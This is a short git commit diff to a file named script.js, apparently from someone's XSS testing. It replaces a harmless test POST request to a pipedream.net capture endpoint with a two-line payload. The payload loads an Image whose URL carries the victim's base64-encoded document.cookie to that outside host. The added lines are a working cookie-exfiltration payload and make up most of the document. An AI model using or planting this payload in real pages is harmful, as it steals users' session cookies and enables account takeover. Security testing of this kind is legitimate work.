61515f7d5cdf2b436d4f9cff1fb13b35127ffa14
jondaveyan <jon.daveyan@gmail.com>
2024-04-17 15:28:18 +0400

    Update script.js

--- script.js
+++ script.js
@@ -1,15 +1,2 @@
-const headers = new Headers()
-headers.append("Content-Type", "application/json")
-
-const body = {
-  "test": "event"
-}
-
-const options = {
-  method: "POST",
-  headers,
-  mode: "cors",
-  body: JSON.stringify(body),
-}
-
-fetch("https://eo701wwoc4t6b3g.m.pipedream.net", options)
+x = new Image(); x.src = 'https://eo701wwoc4t6b3g.m.pipedream.net?
+data='+btoa(document.cookie);
